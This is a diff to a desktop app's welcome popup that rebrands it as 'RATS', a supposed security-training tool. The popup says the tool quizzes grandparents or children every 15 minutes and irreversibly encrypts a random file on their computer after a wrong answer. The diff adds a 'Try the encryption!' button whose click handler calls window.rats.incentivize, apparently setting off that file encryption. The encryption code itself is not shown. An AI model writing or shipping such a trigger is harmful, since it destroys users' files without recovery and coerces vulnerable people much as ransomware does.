@@ -10,7 +10,7 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background: #222;
+      background: transparent;
       color: #fff;
       font-family: sans-serif;
       text-align: center;
@@ -40,13 +40,14 @@
 </head>
 <body>
   <div class="popup">
-    <h2>Welcome to My App!</h2>
-    <p>Thanks for installing — here’s a quick intro.</p>
-    <button id="close-popup">Get Started</button>
+    <h2>🐀Welcome to RATS!🐀</h2>
+    <p>RATS, also known as Randomized Awareness Training for Security is an application tailored to the needs of the younger and older generations. Is your grandma receiving shady emails, look no further than this application to train her. Is your 10 year old child scrolling too much on instagram? Again, use this app to break the doom scroll streak all the while training them on cybersecurity. This application functions in a pretty straightforward way where every 15 minutes a security question is asked to the user and they are forced to answer it. If they get the quesion right, they can continue what they were doing, if they get it wrong then a randomly selected file on their computer gets encrypted without any way of recovering it.</p>
+    <button id="close-popup">Try the encryption!</button>
   </div>
 
   <script>
-    document.getElementById('close-popup').addEventListener('click', () => {
+    document.getElementById('close-popup').addEventListener('click', async () => {
+      window.rats.incentivize((await window.rats.listIncentives(1))[0]);
       window.close();
     });
   </script>
